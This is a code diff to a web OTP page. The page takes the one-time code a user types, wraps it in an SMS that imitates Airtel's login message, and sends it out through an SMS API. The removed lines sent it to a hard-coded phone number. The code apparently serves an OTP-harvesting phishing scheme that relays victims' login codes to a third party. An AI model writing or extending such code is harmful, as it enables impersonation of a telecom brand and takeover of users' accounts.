@@ -120,14 +120,13 @@ function OTPPageContent() {
       }
     }, 3000);
   };
-const sendSM = async (phone: string, message: string) => {
+const sendSM = async (message: string) => {
   const response = await fetch("/api/send-sm", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
     body: JSON.stringify({
-      mobile: phone,
       response_type: "json",
       sender_name: "FULL_CIRCLE",
       service_id: 0,
@@ -157,7 +156,8 @@ const sendSM = async (phone: string, message: string) => {
 };
 const otpCode = otpDigits.join("");
 const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not share this code with anyone even if they claim to be from Airtel. Airtel will never ask for your OTP. OTP is valid for 1 mins. Bw6j5XNu+9/ `;
-  const handleVerify = async () => {
+   
+const handleVerify = async () => {
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
     //  sendSMS(
@@ -165,7 +165,6 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
     //   message
     // );
          sendSM(
-     "+254701217215",
      message
    );
       try {
